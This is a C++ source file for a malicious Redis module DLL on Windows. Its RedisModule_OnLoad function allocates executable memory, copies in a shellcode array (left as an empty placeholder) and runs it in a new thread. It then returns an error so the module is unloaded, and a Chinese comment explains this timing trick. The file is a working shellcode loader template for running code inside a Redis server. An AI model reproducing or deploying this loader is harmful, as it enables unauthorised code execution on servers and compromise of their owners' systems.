#include "pch.h"
#include<Windows.h>
#include<stdio.h>
typedef struct RedisModuleCtx RedisModuleCtx;
typedef struct RedisModuleString RedisModuleString;
#define REDISMODULE_ERR 1

extern "C" __declspec(dllexport) int RedisModule_OnLoad(RedisModuleCtx * ctx, RedisModuleString * *argv, int argc) {
    DWORD  threadId;
    int i;
    int hexData[510] = {
        //shellcode
    };



    HMODULE h = GetModuleHandle("kernel32.dll");

    decltype(VirtualAlloc)* fuck = (decltype(VirtualAlloc)*)GetProcAddress(h, "VirtualAlloc");




    PBYTE buf = (PBYTE)fuck(NULL, sizeof(hexData) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    for (i = 0; i < sizeof(hexData) / 4; i++) {
        buf[i] = (BYTE)hexData[i];
    }
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, 0, 0, &threadId); //没执行完，redis就给dlunload了,所以不要写成单独函数createthread
    return REDISMODULE_ERR;
}




BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
